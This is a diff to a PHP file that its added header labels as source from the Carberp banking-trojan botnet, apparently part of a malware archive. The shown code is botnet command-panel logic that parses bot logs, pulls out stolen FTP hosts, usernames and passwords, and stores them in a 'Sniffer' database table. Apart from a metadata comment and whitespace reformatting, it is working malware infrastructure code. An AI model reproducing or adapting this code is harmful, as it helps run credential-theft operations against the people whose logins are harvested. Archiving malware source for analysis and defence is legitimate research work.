@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 preg_match_all('~#BOTSTART#(.*):(.*)#BOTNIP#(.*?)#BOTEND#~isU', $log, $match, PREG_SET_ORDER);
@@ -32,8 +43,11 @@ if(count($match) > 0){
 		}
 
 		$data = explode("\r\n", $item[3]);
-		if(count($data) > 0){			foreach($data as $line){				$ld = parse_url($line);
-				if($ld['scheme'] == 'ftp' && !empty($ld['host']) && !empty($ld['user']) && !empty($ld['pass'])){					$mysqli->query("INSERT DELAYED INTO bf_filter_ftps (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES ('".$prefix."', '".$pdata."', '".$country."', '".md5($ld['host'] . $ld['user'] . $ld['pass'])."', 'Sniffer', '3', NOW(), '".$ld['host']."', '".$ld['user']."', '".$ld['pass']."')");
+		if(count($data) > 0){
+			foreach($data as $line){
+				$ld = parse_url($line);
+				if($ld['scheme'] == 'ftp' && !empty($ld['host']) && !empty($ld['user']) && !empty($ld['pass'])){
+					$mysqli->query("INSERT DELAYED INTO bf_filter_ftps (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES ('".$prefix."', '".$pdata."', '".$country."', '".md5($ld['host'] . $ld['user'] . $ld['pass'])."', 'Sniffer', '3', NOW(), '".$ld['host']."', '".$ld['user']."', '".$ld['pass']."')");
 				}
 			}
 		}
